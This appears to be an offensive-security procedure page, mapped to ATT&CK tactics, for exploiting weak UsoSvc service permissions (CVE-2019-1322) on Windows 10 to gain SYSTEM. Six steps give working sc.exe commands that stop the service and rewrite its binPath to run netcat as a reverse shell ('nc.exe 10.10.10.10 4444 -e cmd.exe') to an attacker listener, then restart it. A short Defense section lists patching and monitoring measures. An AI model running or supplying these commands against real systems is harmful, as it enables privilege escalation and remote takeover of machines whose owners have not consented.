---
id: d96f51d6-3c3d-41a9-bbd4-9ff1bcc887f5
name: UsoSvc Service Account Remote Command Execution
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:29.506676+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - >-
    [[techniques/Exploitation for Privilege Escalation|T1068 - Exploitation for
    Privilege Escalation]]
  - '[[techniques/Service Execution|T1035 - Service Execution]]'
sub_techniques: []
tags:
  - '[[tags/EoP - Incorrect permissions in services]]'
  - '[[tags/Example with Windows 10 - CVE-2019-1322 UsoSvc]]'
  - '[[tags/Windows - Privilege Escalation]]'
commands:
  - '[[commands/stop-usosvc-service]]'
  - '[[commands/configure-usosvc-binpath-spool-nc]]'
  - '[[commands/configure-usosvc-binpath-mssql-nc]]'
  - '[[commands/configure-usosvc-binpath-cmd-nc]]'
  - '[[commands/query-usosvc-configuration]]'
  - '[[commands/start-usosvc-service]]'
platforms:
  - Windows
tools: []
validated: true
---

# UsoSvc Service Account Remote Command Execution

## Summary

This procedure exploits a privilege escalation vulnerability in the UsoSvc (Update Orchestrator Service) on Windows systems, specifically CVE-2019-1322, where low-privileged users can modify the service's binary path due to incorrect permissions. By reconfiguring the service to execute a reverse shell via netcat (nc.exe), an attacker can achieve remote code execution with SYSTEM privileges, leading to full system compromise.

## Description

The UsoSvc service, responsible for handling Windows Update orchestration, runs under the LocalSystem account but has writable permissions on its configuration for low-privileged users in affected versions (Windows 10 prior to patches). An attacker with initial low-privilege access can stop the service, alter its binPath to point to a command that establishes a reverse shell to an attacker-controlled host, query the configuration to verify changes, and restart the service. This triggers execution of the payload with elevated privileges. The technique is particularly effective in domain environments or standalone Windows hosts for lateral movement or persistence. Success relies on having nc.exe available on the target or in a writable path, and an active listener on the attacker's machine.

## Requirements

1. Low-privileged user access on a vulnerable Windows 10 system (unpatched for CVE-2019-1322).
2. Netcat (nc.exe) binary placed in a writable location on the target, such as C:\Users\[username]\Desktop\nc.exe or C:\Windows\System32\spool\drivers\color\nc.exe.
3. Attacker-controlled host with a listener (e.g., nc -lvnp 4444) at the specified IP and port.
4. Command prompt or PowerShell access on the target.

## Defense

- Apply patches for CVE-2019-1322 immediately to restrict service configuration permissions.
- Run services with least privilege; audit and harden service ACLs using tools like icacls or PowerShell's Get-Acl/Set-Acl.
- Monitor service configuration changes via Windows Event Logs (Event ID 7045 for service installs) and Sysmon (Event ID 13 for file/registry modifications).
- Restrict executable paths for services and enable AppLocker or WDAC to prevent unsigned binaries like nc.exe from running.

## Objectives

1. Escalate from low-privilege to SYSTEM-level access via service misconfiguration.
2. Establish a reverse shell for remote command execution.
3. Verify and maintain persistence through service restarts.

## Instructions

### Step 1: Stop the UsoSvc Service

**Context**: Halting the service is necessary to allow reconfiguration of its binary path without conflicts. This step ensures the service is in a stopped state before modification.

**Command** ([[commands/stop-usosvc-service]]):
```bash
sc.exe stop UsoSvc
```

> This command stops the Update Orchestrator Service. If the service is already stopped or does not exist, it may return an error, but proceed if no critical dependencies are affected.

### Step 2: Attempt Configuration Using Spool Directory Path

**Context**: Test reconfiguration by pointing the binPath to nc.exe in a system directory like the spool folder, which may be writable. This variation accounts for potential path restrictions.

**Command** ([[commands/configure-usosvc-binpath-spool-nc]]):
```bash
sc.exe config usosvc binPath="C:\Windows\System32\spool\drivers\color\nc.exe 10.10.10.10 4444 -e cmd.exe"
```

> Configures the service binary path to execute nc.exe for a reverse shell. Replace 10.10.10.10 and 4444 with your listener IP and port. Expected success: [SC] ChangeServiceConfig SUCCESS.

### Step 3: Attempt Configuration Using User Directory Path

**Context**: If the spool path fails due to permissions, try a user-writable directory like the current user's desktop under a service account path (e.g., mssql-svc, adapted for context).

**Command** ([[commands/configure-usosvc-binpath-mssql-nc]]):
```bash
sc.exe config UsoSvc binpath= "C:\Users\mssql-svc\Desktop\nc.exe 10.10.10.10 4444 -e cmd.exe"
```

> Alternative configuration using a potentially writable user path. Adjust the path to match where nc.exe is placed. Success indicates the binPath has been updated.

### Step 4: Final Configuration Using CMD Wrapper

**Context**: Wrap the nc.exe execution in cmd /C to ensure proper spawning of the shell, bypassing any direct execution issues.

**Command** ([[commands/configure-usosvc-binpath-cmd-nc]]):
```bash
sc.exe config UsoSvc binpath= "cmd /C C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"
```

> This sets the binPath to use cmd.exe to invoke nc.exe, providing a reliable reverse shell trigger. Verify no syntax errors in the path.

### Step 5: Query Service Configuration

**Context**: Confirm the binPath has been successfully modified before restarting, to avoid failed executions.

**Command** ([[commands/query-usosvc-configuration]]):
```bash
sc.exe qc usosvc
```

> Queries the service details. Look for the BINARY_PATH_NAME line to match your configured command, e.g., cmd /C C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe, and SERVICE_START_NAME: LocalSystem.

### Step 6: Start the UsoSvc Service

**Context**: Restarting the service triggers execution of the modified binPath, establishing the reverse shell with elevated privileges.

**Command** ([[commands/start-usosvc-service]]):
```bash
sc.exe start UsoSvc
```

> Initiates the service, running the payload. Monitor your listener for incoming connections from the target.
